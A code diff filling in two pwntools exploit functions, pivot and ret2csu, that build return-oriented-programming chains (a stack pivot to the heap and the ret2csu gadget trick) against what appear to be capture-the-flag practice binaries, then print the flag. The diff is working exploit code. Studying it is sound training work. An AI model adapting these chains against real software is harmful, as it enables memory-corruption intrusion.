@@ -339,12 +339,90 @@ def fluff(path):
     return True
 
 
-def pivot():
-    pass
+def pivot(path):
+
+    p = process(path)
+    #context.log_level = 'debug'
+
+    hint = p.recvline_contains("pivot: ").decode("utf8")
+    pivot = int(hint.split(": ")[1], 16)
+
+    heap_payload = b''
+    heap_payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # dummy r13
+    heap_payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # dummy r14
+    heap_payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # dummy r15
+    heap_payload += b'\x50\x08\x40\x00\x00\x00\x00\x00'  # 0x400850 foothold_function@plt
+    heap_payload += b'\x00\x0b\x40\x00\x00\x00\x00\x00'  # pop rax; ret
+    heap_payload += b'\x48\x20\x60\x00\x00\x00\x00\x00'  # foothold_function@got.plt
+    heap_payload += b'\x05\x0b\x40\x00\x00\x00\x00\x00'  # mov rax, [rax]; ret
+    heap_payload += b'\x00\x09\x40\x00\x00\x00\x00\x00'  # pop rbp; ret
+    heap_payload += b'\x4e\x01\x00\x00\x00\x00\x00\x00'  # 0x14e = offset from foothold to ret2win
+    heap_payload += b'\x09\x0b\x40\x00\x00\x00\x00\x00'  # add rax, rbp; ret
+    heap_payload += b'\x8e\x09\x40\x00\x00\x00\x00\x00'  # call ret2win@libpivot
+
+    stack_payload = b''
+    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    stack_payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    stack_payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RSP
+    stack_payload += b'\x6d\x0b\x40\x00\x00\x00\x00\x00'  # overwrite RIP and pivot to heap
+    stack_payload += p64(pivot)
+
+    fluff1 = p.recvuntil("> ")
+    p.sendline(heap_payload)
+
+    fluff2 = p.recvuntil("> ")
+    p.sendline(stack_payload)
+
+    fluff3 = p.recv()
+
+    flag = p.recv()
+    success(flag)
+
+    return True
 
 
-def ret2csu():
-    pass
+def ret2csu(path):
+
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'  # fill buffer
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'  # overwrite RBP
+    payload += b'\x9a\x08\x40\x00\x00\x00\x00\x00'  # gadget 1
+
+    # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+    # rbp is set to 1 because of the future add rbx, 1; cmp rbp, rbx
+    payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # pop rbx
+    payload += b'\x01\x00\x00\x00\x00\x00\x00\x00'  # pop rbp
+    payload += b'\x48\x0e\x60\x00\x00\x00\x00\x00'  # pop r12 (ptr .fini)
+    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43'  # pop r13
+    payload += b'\x44\x44\x44\x44\x44\x44\x44\x44'  # pop r14
+    payload += b'\xef\xbe\xbe\xba\xfe\xca\xad\xde'  # pop r15
+    payload += b'\x80\x08\x40\x00\x00\x00\x00\x00'  # gadget 2
+
+    # mov rdx, r15; ...; call _fini
+    # + second exec of "gadget 1", but with an add rsp, 8
+    payload += b'\x45\x45\x45\x45\x45\x45\x45\x45'  # add rsp, 8
+    payload += b'\x46\x46\x46\x46\x46\x46\x46\x46'  # pop rbx
+    payload += b'\x47\x47\x47\x47\x47\x47\x47\x47'  # pop rbp
+    payload += b'\x48\x48\x48\x48\x48\x48\x48\x48'  # pop r12
+    payload += b'\x49\x49\x49\x49\x49\x49\x49\x49'  # pop r13
+    payload += b'\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a'  # pop r14
+    payload += b'\x4b\x4b\x4b\x4b\x4b\x4b\x4b\x4b'  # pop r15
+    payload += b'\xb1\x07\x40\x00\x00\x00\x00\x00'  # ret2win()
+
+    p = process(path)
+
+    fluff1 = p.recvuntil("> ")
+    p.sendline(payload)
+
+    flag = p.recv()
+    success(flag)
+
+    return True
 
 
 def __get_file_md5(path):
